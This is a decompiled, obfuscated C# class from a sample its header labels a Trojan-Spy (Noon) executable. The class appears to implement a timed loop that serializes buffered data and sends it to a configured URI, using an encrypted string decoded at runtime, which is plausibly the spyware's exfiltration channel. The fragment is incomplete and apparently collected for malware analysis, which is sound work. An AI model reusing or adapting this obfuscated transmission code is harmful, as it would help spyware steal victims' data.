// Decompiled with JetBrains decompiler
// Type: 55oe2u6i33.8989oi11i5
// Assembly: ao2u718188, Version=0.17.1.12262, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 3DF97629-1C85-445F-828B-3AC8EB815CA9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-d62a3041e22e26079b63e219db0e298b85ae3894521afe783190b1b5f3fa388f.exe

using \u00306uo1e5904;
using \u0035a6974u213;
using Microsoft.ApplicationInsights.Channel;
using Microsoft.Runtime.CompilerServices;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace \u00355oe2u6i33
{
  internal class \u0038989oi11i5 : IDisposable
  {
    private readonly TelemetryBuffer \u0031eeo6a5u35;
    private AutoResetEvent a5oi99e6e0;
    private ooe0i71e11 a56i99uuo5;
    private int \u003213e837oo2;
    private bool i1i3ae4201;

    internal TimeSpan \u00300ee3ee2au { get; set; }

    internal Uri \u0039e39eaou30 { get; set; }

    public void \u003561e60ei81()
    {
      if (Interlocked.Increment(ref this.\u003213e837oo2) != 1 || this.a5oi99e6e0 == null)
        return;
      this.i1i3ae4201 = false;
      try
      {
        this.a5oi99e6e0.Set();
      }
      catch (ObjectDisposedException ex)
      {
      }
    }

    internal void i8e7o401ei()
    {
      IEnumerable<ITelemetry> source = this.\u0031eeo6a5u35.Dequeue();
      if (source == null || !source.Any<ITelemetry>())
        return;
      ConfiguredTaskAwaitable configuredTaskAwaitable = AwaitExtensions.ConfigureAwait(this.a56i99uuo5.\u00369258ueiue(new Transmission(this.\u0039e39eaou30, JsonSerializer.Serialize(source, true), \u0033457o91ea7.\u0039u51uui516(";\u0015h0*\fq&\bp#b)j\u001A\u0016psS7e1\a\u0019q", "rM0tkG8zI7eeyoXM75Vl9kJP4hqXK"), JsonSerializer.CompressionType, new TimeSpan())), false);
      ConfiguredTaskAwaitable.ConfiguredTaskAwaiter awaiter = ((ConfiguredTaskAwaitable) ref configuredTaskAwaitable).GetAwaiter();
      ((ConfiguredTaskAwaitable.ConfiguredTaskAwaiter) ref awaiter).GetResult();
    }

    private void u9eu3a5i2i()
    {
      using (this.a5oi99e6e0 = new AutoResetEvent(false))
      {
        while (this.i1i3ae4201)
        {
          this.i8e7o401ei();
          this.a5oi99e6e0.WaitOne(this.\u00300ee3ee2au);
        }
      }
    }

    private void \u0039io85euuu9()
    {
      if (this.a5oi99e6e0 == null)
        return;
      if (!this.i1i3ae4201)
        return;
      try
      {
        this.a5oi99e6e0.Set();
      }
      catch (ObjectDisposedException ex)
      {
      }
    }

    public \u0038989oi11i5()
      : this((string) null)
    {
    }
  }
}
